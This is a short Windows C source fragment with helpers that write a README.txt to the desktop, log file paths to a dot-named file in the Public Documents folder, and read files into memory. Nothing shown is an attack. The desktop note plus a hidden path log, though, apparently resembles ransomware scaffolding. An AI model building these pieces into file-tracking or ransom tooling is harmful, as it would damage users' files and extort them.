#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>

int create_readme(const char *content) {
    char desktop_path[MAX_PATH];
    
    HRESULT result = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop_path);
    if (result == S_OK) {
        char readme_path[MAX_PATH];
        snprintf(readme_path, sizeof(readme_path), "%s\\README.txt", desktop_path);

        FILE *file = fopen(readme_path, "w");
        if (file) {
            fputs(content, file);
            fclose(file);
            return 1;
        } else {
            return 0;
        }
    } else {
        return 0;
    }
}

void append_to_paths(const char *filepath) {
    const char *paths_file = "C:\\Users\\Public\\Documents\\.paths.txt";

    FILE *file = fopen(paths_file, "a");
    if (file) {
        fprintf(file, "%s\n", filepath);
        fclose(file);
    }
}

char *read_file(const char *filepath) {
    FILE *file = fopen(filepath, "r");
    if (file) {
        fseek(file, 0, SEEK_END);
        long length = ftell(file);
        fseek(file, 0, SEEK_SET);

        char *buffer = malloc(length + 1);
        if (buffer) {
            fread(buffer, 1, length, file);
            buffer[length] = '\0';
        }
        fclose(file);
        return buffer;
    } else {
        return NULL;
    }
}
